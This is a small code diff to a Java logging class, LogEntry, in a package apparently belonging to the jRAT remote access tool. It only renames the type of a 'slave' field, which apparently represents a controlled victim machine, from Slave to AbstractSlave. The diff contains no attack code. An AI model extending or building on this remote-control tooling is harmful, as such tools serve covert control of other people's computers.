@@ -5,13 +5,13 @@ import su.jrat.client.utils.Utils;
 public class LogEntry {
 
 	private String action;
-	private Slave slave;
+	private AbstractSlave slave;
 	private String info;
 	private String date;
 
-	public LogEntry(String action, Slave slave, String info) {
+	public LogEntry(String action, AbstractSlave abstractSlave, String info) {
 		this.action = action;
-		this.slave = slave;
+		this.slave = abstractSlave;
 		this.info = info;
 		this.date = Utils.getDate();
 	}
@@ -24,7 +24,7 @@ public class LogEntry {
 		return action;
 	}
 
-	public Slave getSlave() {
+	public AbstractSlave getSlave() {
 		return slave;
 	}
 
